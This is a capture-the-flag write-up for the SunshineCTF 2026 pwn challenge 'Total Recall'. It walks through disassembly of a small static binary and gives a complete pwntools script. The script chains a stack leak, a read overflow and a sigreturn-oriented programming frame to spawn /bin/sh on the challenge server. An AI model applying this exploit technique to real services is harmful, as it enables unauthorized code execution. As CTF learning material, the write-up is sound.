---
title: "Total Recall"
author: "s0g3king"
date: 2026-09-28
categories: ["Pwn", "SunshineCTF 2026"]
tags: ["srop", "sigreturn", "rop"]
partial_solve: false
used_ai: true
---

## Challenge

A tiny static binary, `nc chal.sunshinectf.games 26003`. Mitigations:

```text
RELRO:  No RELRO
Stack:  No canary
NX:     enabled       (stack is not executable)
PIE:    No PIE        (fixed at 0x400000)
```

## Recon

The whole program is four executable blocks and nothing else:

```asm
_start:
0x401000: call 0x401016        ; G1
0x401005: call 0x40104f        ; G2
0x40100a: mov rax, 0x3c        ; exit
0x401014: syscall

G1 @ 0x401016:
  push rsp / mov rsi,rsp / mov rdi,1 / mov rdx,8 / mov rax,1 / syscall  ; write(1, rsp, 8)  -> leaks a stack addr
  pop rax
  lea rsi,[rsp-0x40] / mov rdi,0 / mov rdx,0x18 / mov rax,0
  0x40104c: syscall            ; read(0, rsp-0x40, 0x18)   -> 24 bytes
  0x40104e: ret

G2 @ 0x40104f:
  lea rsi,[rsp-0x80] / mov rdi,0 / mov rdx,0x400 / mov rax,0
  0x401069: syscall            ; read(0, rsp-0x80, 0x400)  -> 1024 bytes
  0x40106b: ret
```

So the binary hands us:

- a **stack leak** (the `write` in G1),
- two `read` primitives, and G2's `read(0x400)` overflows well past its own
  saved return address — we control the ROP chain,
- two bare **`syscall; ret`** tails at `0x40104c` (G1) and `0x401069` (G2).

NX kills shellcode-on-stack, and there is **no `pop rdi/rsi/rdx` anywhere**, so
the usual "set up registers, call `execve`" ROP is impossible. `.text` is
read-only too.

## Exploit

`rt_sigreturn` (syscall 15) restores the *entire* register set — `rax`, `rdi`,
`rsi`, `rdx`, `rip`, `rsp`, … — from a **sigreturn frame** sitting on the stack.
Since we control the stack, one `rt_sigreturn` lets us set every register at
once, which is exactly what the missing `pop` gadgets would have given us.

Two problems to solve:

1. **Get `rax = 15`** with no `pop rax`. A `read()` syscall leaves its return
   value (the byte count) in `rax`, so if we make a `read()` return **exactly 15
   bytes**, `rax` becomes 15. Then we jump straight to a bare `syscall; ret`
   (skipping the `mov rax, 0` in front of it) so `rax` is still 15 when the
   syscall fires → `rt_sigreturn`.
2. **Frame it for a shell.** The frame sets `rax = 59` (execve), `rdi → "/bin/sh"`,
   `rsi = rdx = 0`, and `rip → 0x401069` (the other `syscall; ret`). After
   `rt_sigreturn` restores those, it lands on the `syscall` → `execve("/bin/sh",
   0, 0)`.

The leaked stack address lets us point `rdi` at the `"/bin/sh"` we place in the
same buffer.

**Flow.** G2's overflow makes G2 `ret` back into **G2** (a second read), whose
next `ret` slot is the `syscall; ret` gadget. On that second G2 call we send
exactly 15 bytes → `rax = 15` → the gadget runs `rt_sigreturn` → frame restores
execve state and jumps to the final `syscall; ret` → shell.

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./total_recall")
IP, PORT = "chal.sunshinectf.games", 26003

G2       = 0x40104f   # read(0, rsp-0x80, 0x400)
SYS_RET  = 0x40104c   # bare "syscall; ret" (becomes rt_sigreturn when rax=15)
SYS_RET2 = 0x401069   # bare "syscall; ret" (fires execve after the frame is restored)

p = remote(IP, PORT) if args.REMOTE else process(elf.path)

addr = u64(p.recv(8))          # leaked stack address of the saved-return slot
buf2 = addr - 0x80             # start of G2's read buffer
log.info(f"leak: {hex(addr)}")

frame = SigreturnFrame()
frame.rax = 0x3b               # execve
frame.rsi = 0
frame.rdx = 0
frame.rsp = addr               # any mapped value
frame.rip = SYS_RET2           # syscall;ret -> execve fires here

payload  = b"\x90" * 0x80      # filler up to the saved return slot
payload += p64(G2)             # [A]    -> loop back into G2 for a second read
payload += p64(SYS_RET)        # [A+8]  -> rt_sigreturn (once rax=15)
payload += bytes(frame)        # the sigreturn frame

frame.rdi = buf2 + len(payload)          # -> where "/bin/sh" lands
payload = payload[:0x90] + bytes(frame)  # rebuild with the correct rdi
payload += b"/bin/sh\x00"
payload = payload.ljust(0x200, b"\x90")

# One write so the 24/512 read split is exact (separate sends can merge).
p.send(b"\x90" * 24 + payload)

time.sleep(0.3)
p.send(b"A" * 15)              # second G2 read returns 15 -> rax = 15 -> rt_sigreturn

p.interactive()
```

## Notes

- Used AI to learn SROP — I wasn't familiar with the technique going in. Epic stuff!
- My dumbass forgot to check that the stack is NX, so I was  trying to put shellcode on it for a while TT.
